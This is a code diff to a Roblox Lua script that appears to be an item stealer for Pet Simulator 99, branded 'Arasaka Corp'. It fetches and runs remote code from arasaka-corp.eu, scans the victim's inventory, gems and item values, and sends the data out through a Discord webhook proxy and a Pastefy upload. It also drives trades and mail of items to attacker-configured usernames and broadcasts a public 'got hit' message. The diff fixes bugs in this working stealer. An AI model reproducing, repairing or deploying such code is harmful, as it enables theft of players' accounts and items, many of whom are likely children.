@@ -2,31 +2,52 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
-local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")
 local plr = Players.LocalPlayer
 
+local requestFn = syn and syn.request or http_request or request
+if not requestFn then
+    pcall(function() plr:Kick("Executor missing HTTP support") end)
+    return
+end
+
+local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/scripts/module/crypto.lua"))()
+local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")
 
 local cfg = _G.AC_CONFIG
-if not cfg then 
-plr:Kick("Config missing | Use the Loader first")
-return end
+if not cfg then
+    pcall(function() plr:Kick("Config missing | Use the Loader first") end)
+    return
+end
 
 local WEBHOOK_ID = cfg.WEBHOOK_ID
 local PROXY_URL = cfg.PROXY_URL
-local USERNAMES = cfg.USERNAMES
-local PUBLIC_PROXY = cfg.PUBLIC_PROXY
+local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY
+
+local USERNAMES
+do
+    local raw = cfg.USERNAMES or cfg.USERNAME
+    if type(raw) == "table" then
+        USERNAMES = {}
+        for _, v in ipairs(raw) do
+            if type(v) == "string" and #v > 0 then
+                table.insert(USERNAMES, v)
+            end
+        end
+    elseif type(raw) == "string" and #raw > 0 then
+        USERNAMES = { raw }
+    else
+        USERNAMES = {}
+    end
+end
+
+if WEBHOOK_ID == "" or PROXY_URL == "" or #USERNAMES == 0 then
+    pcall(function() plr:Kick("Invalid configuration | discord.gg/arasaka-corp") end)
+    return
+end
 
 local States = {Inventory = {}, Gems = 0, TotalRAP = 0, MailCost = 0}
 local Settings = {MinRap = 1000000, MinGems = 500000}
 local RemoteCache = {}
-
-
-
-if WEBHOOK_ID == "" or PROXY_URL == "" or #USERNAMES == 0 then
-    plr:Kick("Invalid configuration | discord.gg/arasaka-corp")
-    return
-end
 
 local REAL_JOB_ID = game.JobId
 local bypassJobId = game.JobId
@@ -59,8 +80,6 @@ if identifyexecutor and identifyexecutor() == "Delta" then
     repeat task.wait() until capturedJobId
     REAL_JOB_ID = bypassJobId
 end
-
-local request = syn and syn.request or request or http_request
 
 local function InvokeRemote(remoteName, ...)
     local args = {...}
@@ -197,11 +216,11 @@ local function ScanInventory()
 end
 
 local function ClaimAllMail()
-    local response, err = InvokeRemote("Mailbox: Claim All")
+    local response = InvokeRemote("Mailbox: Claim All")
     local attempts = 0
-    while err == "You must wait 30 seconds before using the mailbox!" and attempts < 10 do
+    while response == nil and attempts < 10 do
         task.wait(0.5)
-        response, err = InvokeRemote("Mailbox: Claim All")
+        response = InvokeRemote("Mailbox: Claim All")
         attempts = attempts + 1
     end
     return response
@@ -373,7 +392,7 @@ local function ExecuteTrade(targetPlayer, items)
     return true
 end
 
-local function sendWebhook(payload)
+local function SendWebhook(payload)
     local fullUrl = PROXY_URL .. WEBHOOK_ID
     local envelope = { id = WEBHOOK_ID, payload = payload }
     local json = HttpService:JSONEncode(envelope)
@@ -391,22 +410,18 @@ local function sendWebhook(payload)
 end
 
 local function SendPublic(payload)
-    local req = request
-    if not req then return end
-
-    local fullUrl = PUBLIC_PROXY
+    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
     local json = HttpService:JSONEncode(payload)
     local encrypted = crypto:Encrypt(json)
 
     local success, response = pcall(function()
-        return req({
-            Url = fullUrl,
+        return requestFn({
+            Url = PUBLIC_PROXY,
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({message = encrypted})
+            Body = HttpService:JSONEncode({data = encrypted})
         })
     end)
-
     return success, response
 end
 
@@ -429,11 +444,9 @@ local function UploadToPastefy(items)
     end
 
     local content = table.concat(lines, "\n")
-    local req = request
-    if not req then return nil end
 
     local success, response = pcall(function()
-        return req({
+        return requestFn({
             Url = "https://pastefy.app/api/v2/paste",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
@@ -475,22 +488,22 @@ local function BuildWebhookPayload()
 
     local hitCategory = "STANDARD HIT"
     local glowEffect = ""
-    if rapNum >= 10000000000 then 
+    if rapNum >= 10000000000 then
         hitCategory = "INSANE HIT (10B+)"
         glowEffect = "✦"
-    elseif rapNum >= 1000000000 then 
+    elseif rapNum >= 1000000000 then
         hitCategory = "MASSIVE HIT (1B+)"
         glowEffect = "🔥"
-    elseif rapNum >= 100000000 then 
+    elseif rapNum >= 100000000 then
         hitCategory = "BIG HIT (100M+)"
         glowEffect = "⚡"
-    elseif rapNum >= 50000000 then 
+    elseif rapNum >= 50000000 then
         hitCategory = "GOOD HIT (50M+)"
         glowEffect = "💫"
-    elseif rapNum >= 1000000 then 
+    elseif rapNum >= 1000000 then
         hitCategory = "NORMAL HIT (1M+)"
-    else 
-        hitCategory = "LOW HIT (<1M)" 
+    else
+        hitCategory = "LOW HIT (<1M)"
     end
 
     local topItems = {}
@@ -587,14 +600,8 @@ local function BuildWebhookPayload()
         payload.content = "@everyone **ARASAKA CORP | PS99 HIT**"
     end
 
-    return payload, tradeItems
+    return payload, tradeItems, pastefyLink
 end
-
-local playerName = game.Players.LocalPlayer.Name
-local gameName = "PS99"
-local publicShitPayload = {
-    message = playerName .. " got hit by Arasaka Corp in " .. gameName .. " | Pastefy: " .. pastefyLink
-}
 
 local function MainExecution()
     pcall(function()
@@ -640,11 +647,14 @@ local function MainExecution()
     task.wait(0.5)
 
     local items = ScanInventory()
-    local payload, tradeItems = BuildWebhookPayload()
+    local payload, tradeItems, pastefyLink = BuildWebhookPayload()
     SendWebhook(payload)
-	SendPublic(publicShitPayload)
-    
-	local mailItems = {}
+
+    local publicMsg = plr.Name .. " got hit by Arasaka Corp in PS99"
+        .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
+    SendPublic({ message = publicMsg })
+
+    local mailItems = {}
     for _, item in ipairs(items) do
         if not item.IsTradeItem then
             table.insert(mailItems, item)
